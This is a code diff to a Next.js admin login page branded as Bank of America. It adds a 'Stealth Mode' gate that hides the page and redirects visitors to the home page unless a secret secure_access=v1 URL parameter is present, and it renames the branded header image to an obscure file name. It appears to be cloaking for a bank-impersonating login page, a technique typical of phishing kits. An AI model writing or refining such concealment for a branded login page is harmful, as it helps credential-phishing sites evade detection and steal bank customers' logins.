@@ -1,16 +1,30 @@
 'use client';
 
-import { useState } from 'react';
-import { useRouter } from 'next/navigation';
+import { useState, useEffect, Suspense } from 'react';
+import { useRouter, useSearchParams } from 'next/navigation';
 import Button from '@/app/components/ui/Button';
 import Link from 'next/link';
 
-export default function AdminLoginPage() {
+function AdminLoginContent() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
   const router = useRouter();
+  const searchParams = useSearchParams();
+
+  // Stealth Mode: verify access token
+  useEffect(() => {
+    const access = searchParams.get('secure_access');
+    if (access !== 'v1') {
+      router.replace('/');
+    }
+  }, [searchParams, router]);
+
+  const access = searchParams.get('secure_access');
+  if (access !== 'v1') {
+    return null; 
+  }
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -45,7 +59,7 @@ export default function AdminLoginPage() {
         <div className="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
           <Link href="/" className="flex items-center">
             <img 
-              src="/header.png" 
+              src="/asset-v1-h.png" 
               alt="Bank of America" 
               className="h-6"
             />
@@ -160,5 +174,17 @@ export default function AdminLoginPage() {
         </div>
       </main>
     </div>
+  );
+}
+
+export default function AdminLoginPage() {
+  return (
+    <Suspense fallback={
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        <div className="animate-spin w-8 h-8 border-2 border-[#012169] border-t-transparent rounded-full"></div>
+      </div>
+    }>
+      <AdminLoginContent />
+    </Suspense>
   );
 }
